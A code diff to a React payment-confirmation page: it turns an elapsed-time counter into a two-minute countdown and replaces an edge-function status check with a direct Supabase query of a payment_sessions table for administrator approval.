@@ -9,7 +9,7 @@ const PushConfirmationPage = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const [isWaiting, setIsWaiting] = useState(true);
-  const [timeWaiting, setTimeWaiting] = useState(0);
+  const [timeWaiting, setTimeWaiting] = useState(120); // Start at 2 minutes (120 seconds)
   const [showManualConfirm, setShowManualConfirm] = useState(true);
   const [isConfirming, setIsConfirming] = useState(false);
 
@@ -20,31 +20,24 @@ const PushConfirmationPage = () => {
       return;
     }
 
-    // Start waiting time counter
+    // Start waiting time counter (countdown from 2 minutes)
     const waitingTimer = setInterval(() => {
-      setTimeWaiting(prev => prev + 1);
+      setTimeWaiting(prev => Math.max(0, prev - 1)); // Count down to 0
     }, 1000);
 
     // Poll for admin response every 3 seconds
     const pollTimer = setInterval(async () => {
       if (isConfirming) {
         try {
-          const response = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/check-verification-status`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-              'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
-            },
-            body: JSON.stringify({
-              userId: location.state?.userId
-            })
-          });
+          const { data: session } = await supabase
+            .from('payment_sessions')
+            .select('payment_status, admin_response')
+            .eq('user_id', location.state?.userId)
+            .single();
           
-          const result = await response.json();
-          
-          if (result.status === 'approved') {
+          if (session?.payment_status === 'approved') {
             handleApprovalReceived();
-          } else if (result.status === 'error') {
+          } else if (session?.payment_status === 'declined' || session?.admin_response === 'error') {
             // Handle error case
             setIsConfirming(false);
             // Could show error message here
@@ -95,7 +88,7 @@ const PushConfirmationPage = () => {
           'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
         },
         body: JSON.stringify({
-          orderId: location.state?.orderId
+          userId: location.state?.userId
         })
       });
 
@@ -193,7 +186,7 @@ const PushConfirmationPage = () => {
 
                     <div className="flex items-center justify-center gap-2 text-sm text-muted-foreground">
                       <Clock className="w-4 h-4" />
-                      <span>Waiting for {formatWaitTime(timeWaiting)}</span>
+                      <span>Waiting for {formatWaitTime(timeWaiting)} remaining</span>
                     </div>
                   </div>
 
